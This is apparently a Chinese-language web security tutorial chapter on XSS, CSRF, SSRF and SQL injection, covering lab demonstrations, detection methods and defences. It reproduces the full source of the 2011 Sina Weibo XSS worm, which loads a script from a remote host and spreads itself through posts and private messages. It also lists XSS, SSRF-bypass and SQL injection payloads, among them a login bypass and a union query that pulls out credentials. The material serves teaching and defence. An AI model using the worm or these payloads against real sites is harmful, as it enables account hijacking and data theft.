# 四、Web 漏洞攻防

## 1. XSS（cross-site-scripting，跨站脚本）

### (1) XSS 漏洞

最早的 XSS 漏洞可追溯到 1999 年末，微软安全工程师发现一些网站遭到攻击，网站被插入了一些恶意脚本和图像标签，随后微软对此类漏洞进行研究分析，并在 2000 年 1 月正式使用 cross-site-scripting 这个名称并沿用至今，为了与层叠样式表 CSS 区分，其简称为 XSS 而非 CSS

XSS 漏洞通常指`网站对用户输入未作有效过滤，攻击者可以将恶意脚本注入到网站页面，达到执行恶意代码的目的`

现实世界中 XSS 攻击有很多危害，盗号、钓鱼欺诈、篡改页面、刷广告流量、内网扫描、网页挂马、挖矿、键盘窃听、窃取用户隐私等等，因此如果是开发人员，修复 XSS 漏洞不能只单纯想着怎么防止 alert 弹框，我们需要更为全面的防御方案

#### ① 反射型 XSS（非持久型跨站脚本）

反射型 XSS 是`指击者将恶意代码拼接到 URL 参数`，诱使用户点击从而触发攻击，将恶意代码提交给服务器，服务器返回的内容也带上恶意代码导致浏览器执行

* 例如将以下代码拼接到 URL name 参数

  ```html
  <script>alert(1)</script>
  ```

* 从 GET 请求 name 参数获取用户输入后，未经过滤就直接调用 echo 函数输入到页面，最终导致反射型 XSS 的产生

  ```php
  <?php
  if(array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL){
      echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
  }
  ?>
  ```

  ![反射型XSS]()

* Chrome 浏览器 F12 查看网页源码，可以发现输入代码被解析执行了

  ![反射型XSS_F12]()

#### ② 存储型 XSS（持久型跨站脚本）

存储型 XSS 是指`攻击者将恶意代码存储在服务器`，每次访问被插入恶意代码的页面都会触发攻击

存储型 XSS 经常出现在一些可以发表评论的地方，如帖子、博客等，DVWA 靶场就有一个典型的存储型 XSS 案例，是一个留言本的功能，支持用户发表评论，将用户输入的数据直接存储到数据库，并输出到页面上，这个过程因为未做任何过滤，导致了 XSS 存储型漏洞

![DVWA靶场的存储型XSS]()

* 以 DVWA 靶场的存储型 XSS 为例，存储型 XSS 只需要让用户访问包含恶意代码的页面

  ```php
  <?php
  if( isset( $_POST[ 'btnSign' ] ) ) {
      // Get input
      $message = trim( $_POST[ 'mtxMessage' ] );
      $name    = trim( $_POST[ 'txtName' ] );
      // Sanitize message input
      $message = stripslashes( $message );
      $message = mysql_real_escape_string( $message );
      // Sanitize name input
      $name = mysql_real_escape_string( $name );
      // Update database
      $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
      $result = mysql_query( $query ) or die( '<pre>' . mysql_error() . '</pre>' );
      //mysql_close();
  }
  ?>
  ```

  ![存储型XSS]()

* 从 POST 请求获取 mtxMessage txtName 参数后，虽然经过一定过滤才插入到数据库，但是括号不会被过滤，在其他地方将其输出到页面就会被解析，我们在 Message 中输入 `<script>alert(1)</script>`，点击提交即可触发漏洞

  ![存储型XSS_F12]()

#### ③ DOM 型 XSS

DOM 型 XSS 是基于文档对象类型 DOM 的一种漏洞，不经过服务器，而是通过 URL 参数触发，因此也属于反射型 XSS

DOM 型 XSS 是指`攻击者通过 JS 代码获取当前页面 URL`，进行处理后动态更新到页面的一种漏洞。由于客户端 JS 可以访问浏览器页面中的 DOM 对象，因此能够决定如何处理当前页面的 URL，比如获取 URL 的相关数据进行处理，然后动态更新到页面上，这导致 DOM 型 XSS 漏洞代码常位于网页的 JS 代码

![Pikachu靶场的DOM型XSS]()

* 以 Pikachu 靶场的 DOM 型 XSS 为例，只有一个文本输入框加一个按钮，查看按钮回调函数如下

  ![DOM型XSS]()

  ![DOM型XSS_回调]()

* 直接利用 JS 伪协议构造链接来触发 JS 代码的执行

  ![DOM型XSS_触发]()

### (2) XSS 攻击

#### ① 窃取 Cookie 劫持他人的会话

Cookie 是服务器提供的存储在客户端的数据，允许 JS 脚本通过 `document.cookie` 访问，常用于识别用户身份和保存会话等功能，如果 Web 引用程序存在 XSS 漏洞，攻击者就可以通过注入恶意 JS 脚本窃取 Cookie，进而以用户身份执行恶意操作

* 以百度网站为例，F12 console 标签页输入 document.cookie 可以访问当前百度域名下的 Cookie

![百度Cookie]()

#### ② 蠕虫攻击

XSS 蠕虫攻击的实现正是得益于 `AJAX` 的出现，AJAX 正是 Web2.0 的标志性技术，AJAX 的核心技术是 XMLHttpRequest 对象，其允许 JS 脚本与服务器通信，在不刷新页面的情况下向服务器发送数据或接收服务器的响应数据

* 以新浪微博 XSS 蠕虫攻击事件为例，2011 年 6 月 28 日，新浪微博遭受 XSS 蠕虫的攻击，很多受害者被迫发出带有攻击链接的私信和微博，其他用户点击后也会受此影响，受害者在感染后都会自动关注一个名为 hellosamy 的微博用户，然后向关注受害者的微博用户发送带有同样链接地址的私信，得益于这种传播方式，短短 16 分钟病毒就感染了 3.3 万个用户
* 新浪微博的 XSS 蠕虫代码如下，针对总结出 XSS 蠕虫的攻击流程
  * 利用 XSS 漏洞插入恶意 JS 代码
  * 利用 XmlHttpRequest 发送请求去发表微博、关注用户、获取关注者列表并向其发送私信
  * 微博消息和私信都包含恶意攻击链接，等同于实现了攻击代码的自我复制和传播

  ```javascript
  // 创建 XMLHttp 对象用于收发请求
  function createXHR(){ 
      return window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
  }

  function getappkey(url){
      xmlHttp = createXHR();
      xmlHttp.open("GET",url,false); //获取 AppKey 不采用异步执行,等待请求返回 
      xmlHttp.send();
      result = xmlHttp.responseText;
      id_arr = '';

      // 正则匹配出 AppKey 数组,包含每个被收听用户的 uid 
      id = result.match(/namecard=\"true\" title=\"[^\"]*/g);

      for(i=0;i<id.length;i++){
          sum = id[i].toString().split('"')[3];  //重新提取整理
          id_arr += sum + '||';
      }
      return id_arr;
  }

  function random_msg(){
      // 使用短地址服务，构造 XSS 传播连接，隐藏自己的恶意 js 脚本，
      // 这里正是 XSS 漏洞的触发位置
      //http://weibo.com/pub/star/g/xyyyd%22%3E%3Cscript%20src=//www.2kt.cn/images/t.js%3E%3C/script%3E?type=upd
      link = ' http://163.fm/PxZHoxn?id=' + new Date().getTime();;

      // 话题列表 
      var msgs = [
          '郭美美事件的一些未注意到的细节：',
          '建党大业中穿帮的地方：',
          '让女人心动的 100 句诗歌：',
          '3D 肉团团高清普通话版种子：',
          '这是传说中的神仙眷侣啊：',
          '惊爆!范冰冰艳照真流出了：',
          '杨幂被爆多次被潜规则:',
          '傻仔拿锤子去抢银行：',
          '可以监听别人手机的软件：',
          '个税起征点有望提到 4000：']; 

      //随机选取话题,加上之前的传播连接作为微博内容 
      var msg = msgs[Math.floor(Math.random()*msgs.length)] + link;
      msg = encodeURIComponent(msg); //对内容进行 Url 编码
      return msg;
  }

  // 利用 Ajax 发送 POST 请求
  function post(url,data,sync){
      xmlHttp = createXHR();
      xmlHttp.open("POST",url,sync);
      xmlHttp.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
      xmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded; charset=UTF-8");
      xmlHttp.send(data);
  }

  // 发表微博，话题随机
  function publish(){
      url = 'http://weibo.com/mblog/publish.php?rnd=' + new Date().getTime();
      data = 'content=' + random_msg() + '&pic=&styleid=2&retcode='; //使用 random_msg 生成随机话题
      post(url,data,true);
  }

  // 自动关注用户
  function follow(){
      url = 'http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&atnId=profile&rnd=' + new Date().getTime();
      // 使用当前页面存储的$CONFIG.$uid 构造自动关注数据包
      data = 'uid=' + 2201270010 + '&fromuid=' + $CONFIG.$uid + '&refer_sort=profile&atnId=profile';
      post(url,data,true);
  }

  // 发送私信
  function message(){
      url = 'http://weibo.com/' + $CONFIG.$uid + '/follow'; //构造用户关注用户列表页 Url
      ids = getappkey(url); //获取被关注用户的 Appkey 数组
      id = ids.split('||'); //分割出每个被关注用户的 Appkey
      for(i=0;i<id.length - 1 & i<5;i++){
          //构造私信发送 Url
          msgurl = 'http://weibo.com/message/addmsg.php?rnd=' + new Date().getTime();
          msg = random_msg();
          msg = encodeURIComponent(msg);
          user = encodeURIComponent(encodeURIComponent(id[i]));
          data = 'content=' + msg + '&name=' + user + '&retcode=';
          post(msgurl,data,false);  //通过 XmlHttpRequest 发送请求
      }
  }

  function main(){
      try{
          publish(); //模拟发表微博
      }catch(e){}
      try{
          follow(); //模拟关注用户
      }catch(e){}
      try{
          message(); //模拟发送私信
      }catch(e){}
  }
  try{
      //在当前 body 尾部插入存放在远端的 Xss 恶意脚本
     x="g=document.createElement('script');g.src='http://www.2kt.cn/images/t.js';document.body.appendChild(g)"; 
    window.opener.eval(x);
  }catch(e){}

  main();

  var t=setTimeout('location="http://weibo.com/pub/topic";',5000); //等待 5 秒跳转到微话题页面
  ```

### (3) XSS 漏洞挖掘

#### ① 白盒测试（有源码）

通过分析源码来检测 XSS 漏洞，根据不同的编程语言采用不同的词法、语法分析方式、然后通过`污点分析（追踪用户的输入数据是否达到特定的漏洞触发函数）`的思路来检测漏洞

* **正向分析**：污点就是用户可控的输入数据，正向分析就是追踪污点的传播过程，检测是否传播给危险的输出函数例如 echo、eval 等
* **反向分析**：先查看一些危险的输出函数例如 echo、eval 等，再回溯它的参数传递，判断是否有未经过滤的用户输入数据

![污点分析流程]()

#### ② 黑盒测试（无源码）

通过发送`特意构造的攻击字符串`来验证漏洞，例如 `<script> alert(1)</script>`，之后再看是否会出现弹框，会则代表存在 XSS 漏洞

* **人工测试**：人工测试的主要思路就是在`一切可输入数据的地方`输入 `XSS payload`，这些地方包含所有的 GET、POST、Cookie、HTTP 等等，提交数据之后看网站的输出是否解析了前面输入的字符串，平时测试时可以将多个 XSS payload 放在一个 txt 文件中并用数字区分每个用例，一次性全复制进输入框测试，若有弹框根据数字就知道是哪个用例被执行

```txt
<XSS id=x tabindex=1 onactivate=alert(1)></XSS>
<body onafterprint=alert(2)>
<XSS onafterscriptexecute=alert(3)><script>1</script>
<body onbeforeprint=alert(4)>
<svg><animate onbegin=alert(5) attributeName=x dur=1s>
```

* **工具自动化测试**：XSStrike、NoXSS

### (4) XSS 防御方案

#### ① 输入检查

* **白名单范围**：最推荐的方法就是白名单，例如参数是个整数值，直接限制死整数范围即可，不符合就抛出异常，单纯想着过滤替换特殊字符，很容易就被绕过
* **黑名单限制**：如果白名单范围不好确定，就需要采用黑名单的方式，将常用的 XSS payload 特殊字符或字符串做检测，但是黑名单有时结合业务场景以及浏览器特性，很可能被找到绕过方法
* **服务端限制**：不能单纯只在客户端上做过滤，还需要结合服务端做限制，只在客户端上做过滤，`抓包修改数据重发`就绕过限制了

#### ② 输出检查

跨站漏洞的触发关键点就在输出位置，因此输出检查尤为重要

以前百度 Hi 空间有个 XSS 漏洞，官方后来虽然修复了，但发现者的百度 Hi 空间仍存在 XSS 弹框，这正是因为官方的修复方案中只做了输入检查没有输出检查，导致以前曾被利用过的 XSS payload 仍然有效，`如果在官方修复前，那个 XSS 漏洞已经被恶意利用了，即使通过输入检查修复，被插入的恶意代码仍会存在，这可以认为是修复不彻底的表现`

如何根据`不同输出位置`采取不同的 XSS 防御方案？

![XSS_输出检查]()

#### ③ 防御 DOM XSS

DOM XSS 是一种特殊的 XSS 类型，不太适合前面介绍的防御方法

* 根据`不同输出位置`采取不同的 XSS 防御方案

  ![DOM型XSS防御]()

* 不允许获取 Cookie
  * 服务器的 Set-Cookie 字段指定 `Secure` 属性，浏览器只有在加密协议 HTTPS 下才将 Cookie 发送给服务器
  * 服务器的 Set-Cookie 字段指定 `HttpOnly` 属性，Cookie 无法由 JS 脚本使用 `document.cookie` 获得，主要目的是为了防止跨站脚本攻击 XSS (Cross-site scripting) 对 Cookie 信息的窃取

  ```javascript
  Set-Cookie: sid=hdhfhbg136254; Secure; HttpOnly
  ```

## 2. CSRF（Cross Site Request Forgery，跨站请求伪造）

### (1) CSRF 漏洞

CSRF 是由于`未校验请求来源，导致攻击者可在第三方站点，以受害者的目标网站登录态，向目标网站发起跨站 HTTP 请求，从而执行一些敏感的业务操作`，例如更改密码、修改个人资料等等

例如用户先登陆银行网站，银行服务器返回一个 Cookie，用户又访问恶意网站，上面有一个表单，用户一旦被诱骗发送这个表单，银行网站就会收到带有正确 Cookie 的请求，这种由第三方网站引导发出的 Cookie，就被称为`第三方 Cookie`

![SCRF原理]()

#### ① CSRF 读

通过伪造跨站请求来`获取返回的敏感信息`，例如用户资料，常见的就是 JSON 劫持

#### ② CSRF 写

通过伪造跨站请求去`修改网站数据`，例如修改密码、发表文章、发送消息等

### (2) CSRF 攻击

* 如下重置密码页面

  ![重置密码]()

  输入新密码后，提交的同时抓包

  ![重置密码抓包]()

* 直接构造以下链接发给受害者，受害者点击链接后，新密码就会被重置为你设置的密码

  ```html
  http://127.0.0.1/vulnerabilities/csrf/?password_new={你设置的密码}&password_conf={你设置的密码}&Change=Change
  ```

### (3) CSRF 漏洞挖掘

CSRF 漏洞挖掘思路如下

* 抓包记录正常的 HTTP 请求
* 分析 HTTP 请求参数是否可预测，以及相应的用途
* 更改 referer 为第三方站点，重发请求
* 判断是否与正常请求效果相同，若相同则可能存在 CSRF 漏洞

CSRF 漏洞的危害主要取决于`参数用途`，这导致很多时候需要人工验证，因此自动化 CSRF 检测工具大多不太好用

### (4) CSRF 防御方案

CSRF 防御方案的关键思路就是`令请求参数不可预测`

不推荐请求字段 referer 限制方法，因为可以通过 `javascript://` 伪协议以`空的 referer` 发起请求绕开限制，如果直接禁止空的 referer，一些移动 APP 上的请求很可能无法完成，因此移动 APP 的 HTTP/HTTPS 请求经常是空的 referer

#### ① 验证码

在一些重要的敏感操作上设置验证码，例如短信、图片等

![验证码]()

#### ② Token 验证

Token 验证`对于用户无感知`，体验效果上比验证码好很多，

生成 Token 的算法，常取登录后的 cookie 采用一些加密/哈希算法生成，为了方便服务器校验和区分用户

#### ③ Cookie SameSite

Chrome 51 浏览器为 Cookie 新增了一个 `SameSite 属性`，服务器的 `Set-Cookie` 字段通过指定 SameSite 属性用来限制第三方 Cookie 以防止 CSRF 攻击，SameSite 属性可以设置三个值

* Strict 完全禁止第三方 Cookie，跨站点时任何情况下都不会发送 Cookie，换言之，只有当前网页的 URI 与请求 URI 完全一致，才会带上 Cookie
  
  ```javascript
  Set-Cookie: sid=sjkhfiuegfie; SameSite=strict;
  ```

* Lax 是大多数情况下不发送 Cookie，如下表格所示
  
  |请求类型|示例|正常情况|Lax|
  |-------|----|-------|---|
  |链接    |`<a href="..."></a>`                |发送|发送|
  |预加载  |`<link rel="prerender" href="..."/>`|发送|发送|
  |GET表单 |`<form method="GET" action="...`    |发送|发送|
  |POST表单|`<form method="POST" action="...">` |发送|不发送|
  |iframe  |`<iframe src="..."></iframe>`       |发送|不发送|
  |AJAX    |`$.get("...")`                      |发送|不发送|
  |Image   |`<img src="...">`                   |发送|不发送|

* Chrome 默认设置 SameSite=Lax，这时可以通过设置 SameSite=None 显式关闭 SameSite 属性，不过前提是必须同时设置 Secure 属性，否则无效
  
  ```javascript
  //无效
  Set-Cookie: sid=abc123; SameSite=None;

  //有效
  Set-Cookie: sid=abc123; SameSite=None; Secure;
  ```

## 3. SSRF（Server-Side Request Forgery，服务端请求伪造）

### (1) SSRF 漏洞

SSRF 是指`攻击者向服务器发送包含恶意 URL 链接的请求`，借由服务器去访问该 URL，以获取受保护网络内的资源的一种安全漏洞

SSRF 常用于`攻击者无法访问到的网络区域`，例如服务器所在的内网、受防火墙保护的主机等等

![SSRF原理]()

SSRF 的危害如下

* **内网探测**：对内网服务器、办公机进行资产扫描等
* **窃取本地和内网**：访问和下载内网的敏感数据，利用 `file://` 协议访问服务器本地文件
* **攻击服务器本地或内网应用**：利用发现的漏洞进一步发起攻击
* **跳板攻击**：借助存在 SSRF 漏洞的服务器对内或对外发起攻击，以此隐藏自己的真实 IP
* **绕过安全防御**：绕过防火墙、CDN 等防御

### (2) SSRF 攻击

#### ① 读取本地文件

利用 `file://` 协议读取服务器的本地文件

#### ② 攻击内网应用漏洞

有些业务为了测试，在内网搭建了一些漏洞或是有漏洞没有及时修复，然后有一些被外部 SSRF 漏洞利用 Struts2 漏洞控制了内网服务器

#### ③ 绕过 IP 限制

如果存在 IP 限制，可以利用如下方法绕过

* **IPv6**：http://2000::1:2345:6789:abcd
* **localhost**：http://127.127.127.127、http://0.0.0.0、http://127.1
* **八进制 IP**：http://0177.0.0.01，相当于 127.0.0.1
* **十进制 IP**：http://2130706433，相当于 127.0.0.1
* **十六进制 IP**：http://0x7f.0x0.0x0.0x1，相当于 127.0.0.1
* **多进制混合 IP**：http://0177.0x0.0x0.1，相当于 127.0.0.1

#### ④ 绕过 URL 解析限制

如果存在 URL 解析限制，可以利用如下方法绕过

* **使用其他可用的协议**
* **Unicode 转换**：http://evil.c ℀.office.com
* **URL 欺骗方式**：http://127.1.1.1@127.2.2.2、http://evil$google.com
* **302 跳转切换协议**：请求头注入"Location: dict://lagou.com"

### (3) SSRF 漏洞挖掘

#### ① 如何判断是否存在 SSRF 漏洞

判断 SSRF 漏洞是否存在，主要有以下 4 种方式

* **回显判断**：有请求返回结果，并且会显示出来
* **访问日志检查**：伪造请求到自己控制的公网服务器，然后在服务器上查看访问日志是否有来自漏洞服务器的请求，或者直接使用命令 `nc -lvp` 来监听请求
* **延时对比**：对比访问不同 IP/域名的访问时长，比如对百度与 Google（国内访问受限）的访问时间，访问百度的时间通常比 Google 快
* **DNS 请求检测**：自己搭建 DNS 服务器，或者利用网上的 DNSLog 服务（http://www.dnslog.cn/），生成一个域名（l08bgh.dnslog.cn）用于伪造请求，看漏洞服务器是否发起 DNS 解析请求，若发起在 DNSLog.cn 上就会有解析日志

#### ② 容易出现 SSRF 漏洞的业务场景

* **社交分享功能**：社交分享也是容易出现 SSRF 漏洞的地方
* **信息采集功能**：例如图片、文章收藏、网页快照、网页翻译、网页剪裁等
* **文件处理功能**：例如负责处理音视频的 ffmpeg，负责处理图片的 ImageMagic、处理办公文件的Office，PDF 文档解析功能，还有 XML 解析器等
* **凡是能够对外发起网络请求且地址被用户可控的地方**：例如 RSS 订阅、字幕下载、支持输入 URL 的功能、嵌入远程图片、收取第三方邮箱邮件等

#### ③ 检测 SSRF 的通用方法和工具（Burp Collaborator）

`BurpSuite` 工具默认提供 `Collaborator Server` 功能用于实现 DNS 解析，在一些无回显的安全测试中，会将解析日志返回给 BurpSuite

![Burp Collaborator]()

Burp Collaborator 原理如下图所示，先利用 SSRF 漏洞让目标应用向 Burp 提供的 DNS 解析服务器 Burp Collaborator Server 发起请求，然后 Burp Collaborator Server 会查询对应的 DNS 请求记录并返回给 BurpSuite，从而帮助测试者判断 SSRF 漏洞是否存在

![Burp Collaborator原理]()

Burp Collaborator 使用过程如下

* 先打开 Burp Collaborator Client
  ![Burp Collaborator Client]()
* 点击 Copy to clipboard 获取生成的域名，我这里生成的是 c3g9ga6x5zdxijo5d3aifxv6nxtnhc.burpcollaborator.net
  ![Copy to clipboard]()

* 利用生成的域名构造如下链接

  ```html
  http://localhost:8080/vul/ssrf/ssrf_curl.php?url=http://c3g9ga6x5zdxijo5d3aifxv6nxtnhc.burpcollaborator.net

  ```

* 访问后回到 Burp Collaborator client，点击 Poll now 就可以看到 DNS 请求记录，这说明存在 SSRF 漏洞
  ![Poll now]()

### (4) SSRF 防御方案

* **限制内网 IP 访问**：常见的内网 IP 段有 10.0.0.0 - 10.255.255.255、172.16.0.0 - 172.31.255.255、192.168.0.0 - 192.168.255.255
* **白名单限制 IP/域名**：只允许访问特定的 IP 或域名
* **禁用一些不必要的协议**：例如 file://、gopher://、dict://

## 4. SQL 注入

### (1) SQL 注入

SQL 注入是指未对用户输入数据进行有效过滤，直接带入 SQL 语句解析，使得原本应为参数的内容，却被用来拼接 SQL 语句，也就是说`将数据当成代码解析`

#### ① 数字型注入

注入的参数是`数字`，参数两边不存在`单引号`

#### ② 字符型注入

注入的参数是`字符`，参数两边存在`单引号`

* 例如号称可以登录任意网站管理后台的万能密码，只要在用户名和密码中都输入 `'or'1'='1` 即可登录后台
* 用户在登录框输入的用户名和密码，未经过滤就直接传入以下 SQL 语句
  $uname 两边存在单引号即为`字符型注入`

  ```sql
  SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1
  ```

* 输入万能密码后 SQL 语句组成如下，可以看到 SQL 语句必然成立

  ```sql
  SELECT username, password FROM users WHERE username=''or'1'='1' and password=''or'1'='1' LIMIT 0,1
  ```

### (2) SQL 注入漏洞挖掘

`sqlmap` 是当前 SQL 注入利用工具中的王者，涵盖了 SQL 注入检测、利用、防御绕过、扩展、getshell 等多种功能，功能全面且工程化，是学习研究 SQL 注入绕不开的工具，查看 sqlmap 的命令帮助信息，可以发现 sqlmap 共使用如下 6 种 SQL 注入漏洞挖掘技术，默认全开，对应的参数值为 `BEUSTQ`

#### ① 布尔型盲注（Boolean-based blind，B）

盲注就是`没有错误回显`，布尔型盲注就是通过`对比真假请求的响应内容`来判断是否存在 SQL 注入

* 导致注入的 SQL 语句如下，$id 两边存在单引号即为`字符型注入`

  ```sql
  SELECT * FROM users WHERE id='$id' LIMIT 0,1
  ```

* 构造如下两个 URL 请求对比差异，`+` 在 URL 中相当于`空格`

  ```html
  http://localhost/Less-8/?id=1'and+1=1
  http://localhost/Less-8/?id=1'and+1=2
  ```

  将测试 URL 带入 SQL 语句，单引号未得到闭合，导致语法错误
  
  ```sql
  SELECT * FROM users WHERE id='1'and 1=1' LIMIT 0,1
  ```

  ```sql
  SELECT * FROM users WHERE id='1'and 1=2' LIMIT 0,1
  ```

* 考虑用 `--` 注释掉未闭合的单引号，按此思路重新构造两个 URL 请求

  ```html
  http://localhost/Less-8/?id=1'and+1=1--+
  http://localhost/Less-8/?id=1'and+1=2--+
  ```

  将测试 URL 带入 SQL 语句，单引号得到闭合

  ```sql
  SELECT * FROM users WHERE id='1'and 1=1 -- ' LIMIT 0,1
  ```

  ```sql
  SELECT * FROM users WHERE id='1'and 1=2 -- ' LIMIT 0,1
  ```

* 两个测试 URL 请求的`展示页面不一致`，代表存在 SQL 注入

#### ② 报错型注入（Error-based，E）

有错误回显的都可以尝试报错型注入

* 导致注入的 SQL 语句如下，$id 两边不存在单引号即为`数字型注入`

  ```sql
  SELECT * FROM users WHERE id=$id LIMIT 0,1
  ```

* 构造如下 URL 请求，各种造成 SQL 语句无法闭合的字符：单引号、双引号、大中小括号、特殊字符等，SQL 语句中的关键词例如 IF、SELECT 等都会造成 SQL 语句错误

  ```html
  http://localhost/Less-8/?id=1 IF
  ```

  将测试 URL 带入 SQL 语句，IF 关键字导致语法错误

  ```sql
  SELECT * FROM users WHERE id=1 IF LIMIT 0,1
  ```

* 测试 URL 请求的展示页面会有错误回显

#### ③ 联合查询注入（Union query-based，U）

联合查询是指使用 `union` 语句来查询，union 语句用于`合并多个 SELECT 语句的结果集`，但限制每个 SELECT 语句必须拥有`相同数量的列`

* 导致注入的 SQL 语句如下，$id 两边不存在单引号即为`数字型注入`

  ```sql
  SELECT * FROM users WHERE id=$id LIMIT 0,1
  ```

* 构造如下 URL 请求

  ```html
  http://localhost/Less-2/?id=0 union select 1
  ```

  将测试 URL 带入 SQL 语句

  ```sql
  SELECT * FROM users WHERE id=0 union select 1 LIMIT 0,1
  ```

  页面得到错误提示，`The used SELECT statements have a different number of columns`，也就是 SELECT 语句的列数有误

* 重新构造 URL，通过逐渐增加列数来找到合适的列数

  ```html
  http://localhost/Less-2/?id=0 union select 1,2   //错误回显
  http://localhost/Less-2/?id=0 union select 1,2,3 //正确，可知共有 3 个列
  ```

* 进一步构造 URL 以获取数据库名和版本信息

  ```html
  http://localhost/Less-2/?id=0 union select 1,database(),version()
  ```

#### ④ 多语句堆叠注入（Stacked queries，T）

SQL 允许使用`分号`间隔多条查询语句来执行，`mysqli_multi_query()` 函数可以通过分号间隔插入多条查询语句来实现堆叠注入

* 导致注入的 SQL 语句如下，$id 两边存在单引号即为`字符型注入`

  ```sql
  <?php
    $id = $_GET['id'];
    $sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    if(mysqli_multi_query($con1, $sql)){}
  ?>
  ```

* 构造如下 URL 请求，尝试插入另一条语句来创建表

  ```html
  http://localhost/Less-38?id=1';create table sqli like users;
  ```

  将测试 URL 带入 SQL 语句

  ```sql
  <?php
    $id = $_GET['id'];
    $sql = "SELECT * FROM users WHERE id='1';create table sqli like users' LIMIT 0,1";
    if(mysqli_multi_query($con1, $sql)){}
  ?>
  ```

* 执行前的表

  ```sql
  mysql> show tables;
  +--------------------+
  | Tables_in_security |
  +--------------------+
  | emails             |
  | referers           |
  | uagents            |
  | users              |
  +--------------------+
  4 rows in set (0.00 sec)
  ```

  执行后的表，成功创建 sqli 表，说明第二条语句执行成功

  ```sql
  mysql> show tables;
  +--------------------+
  | Tables_in_security |
  +--------------------+
  | emails             |
  | referers           |
  | sqli               |
  | uagents            |
  | users              |
  +--------------------+
  5 rows in set (0.00 sec)
  ```

#### ⑤ 基于时间延迟盲注（Time-based blind，T）

基于时间延迟盲注是通过`时间延迟`来判断是否存在 SQL 注入的常用方法，适用于`无任何错误回显`下的盲注，对于正确语句和错误语句都返回相同内容时也可以使用，适用范围更广一些

MySQL 常用的延时注入方法中较实用的有以下 3 种

* **SLEEP（duration）**：该函数用于休眠，起到延时操作的作用，参数以秒为单位

  ```sql
  mysql> select sleep(5);
  +----------+
  | sleep(5) |
  +----------+
  |        0 |
  +----------+
  1 row in set (5.00 sec)
  ```

* **BENCHMARK（count，expr）**：该函数用于重复计算 expr 表达式 count 次

  ```sql
  mysql> select benchmark(10000000,sha(1));
  +----------------------------+
  | benchmark(10000000,sha(1)) |
  +----------------------------+
  |                          0 |
  +----------------------------+
  1 row in set (2.72 sec)
  ```

* **REPEAT（str，count）**：该函数用于返回 str 重复 count 次后的字符串

  ```sql
  mysql> select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',50),'b');
  +-------------------------------------------------------------+
  | rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',50),'b') |
  +-------------------------------------------------------------+
  |                                                           0 |
  +-------------------------------------------------------------+
  1 row in set (5.92 sec)
  ```

具体实例如下

* 导致注入的 SQL 语句如下，$id 两边不存在单引号即为`数字型注入`

  ```sql
  SELECT * FROM users WHERE id=$id LIMIT 0,1
  ```

* 构造如下 URL 请求，进行延迟注入

  ```html
  http://localhost/Less-2/?id=1 and sleep(5)--+
  ```

  将测试 URL 带入 SQL 语句

  ```sql
  SELECT * FROM users WHERE id=1 and sleep(5)--+ LIMIT 0,1
  ```

* Chrome 浏览器的 Network 标签内可以看到该请求刚好延时 5 秒钟，说明确实存在漏洞

  ![基于时间延迟盲注]()

#### ⑥ 内联/嵌套查询注入（Inline queries，Q）

内联/嵌套查询就是`嵌套在另一个查询中的查询`

* 导致注入的 SQL 语句如下，$id 两边不存在单引号即为`数字型注入`

  ```sql
  SELECT * FROM users WHERE id=$id LIMIT 0,1
  ```

* 构造如下 URL 请求，进行延迟注入

  ```html
  http://localhost/Less-2/?id=0 union select 1,(SELECT username from users where id=2),(SELECT password from users where id=2)
  ```

  将测试 URL 带入 SQL 语句，获取 id=2 的用户的用户名和密码

  ```sql
  SELECT * FROM users WHERE id=0 union select 1,(SELECT username from users where id=2),(SELECT password from users where id=2) LIMIT 0,1
  ```

### (3) SQL 注入自动化检测

#### ① 静态应用安全测试（Static Application Security Testing，SAST）

SAST 是通过`分析应用程序源代码`以提早发现安全漏洞

SAST 的工作流程如下

![SAST工作流程]()

SAST 在产品形式上主要体现为`代码审计系统`等，PHP 的商业 SAST 产品有 RIPS、CheckMax 等，其中以 RIPS 审计能力最强，目前还没有比它更优秀的 PHP 代码审计产品

#### ② 动态应用安全测试（Dynamic Application Security Testing，DAST）

DAST 是`对应用程序进行黑盒分析`，通常在测试或运行阶段分析应用程序的动态运行状态，通过模拟黑客行为对应用程序进行动态攻击，分析应用程序的反应，从而确定是否存在漏洞

DAST 的工作流程如下

![DAST工作流程]()

DAST 在产品形式上主要体现为`漏洞扫描器`，著名的商业产品有 Acunetix Web Vulnerability Scanner（AWVS）、AppScan，还有国内长亭在 GitHub 上放出的 xray，这些都是许多白帽子喜欢用的扫描器

#### ③ 交互式应用安全测试（Interactive Application Security Testing，IAST）

IAST `融合了 DAST 和 SAST 的优势`，漏洞检出率极高、误报率极低，同时可以定位到 API 接口和代码片段，IAST 主要有`代理`和`插桩`两种模式，其他的 VPN 或流量镜像都是类似代理的流量采集方式

IAST 的工作流程如下

![IAST工作流程]()

IAST 产品有百度的 OpenRASP-IAST，它是在 OpenRASP 的基础上引入了 DAST 扫描器，组合成完整的 IAST。除此之外，AWVS AcuSensor 和 AppScan 也都引入 IAST 技术，支持在服务端部署 Agent 去监控程序并采集信息，再提供给扫描器进行进一步的扫描

### (4) SQL 注入防御方案

#### ① 白名单

白名单就是`请求参数有特定值的约束`，例如参数是固定整数值，就只允许接收整数

#### ② 参数化查询/预编译查询

参数化查询是`预编译 SQL 语句`的一种方式，将`输入数据插入到 SQL 语句的参数`，防止输入数据被当作 SQL 语句执行，从而防止 SQL 注入漏洞

使用参数化查询需要注意以下三点

* 每个数据库查询都应该使用参数化查询，避免二次注入
* 每个输入参数都应该被参数化查询，避免部分参数注入
* 参数名不能使用指定查询中的表和字段名，避免被误操作

#### ③ Web 防火墙（WAF）

WAF 能够`抵挡大部分攻击`，几乎是当前各网站必备的安全产品，但也不是无懈可击的

国内的 WAF 产品大概排名如下：阿里云 WAF > 腾讯云 WAF > 华为云 WAF > 长亭雷池

#### ④ 运行时应用程序自我保护（Runtime Application Self-Protection，RASP）

RASP 是通过`搜集和分析应用程序运行时的相关信息`来检测和阻止针对应用程序本身的攻击的技术

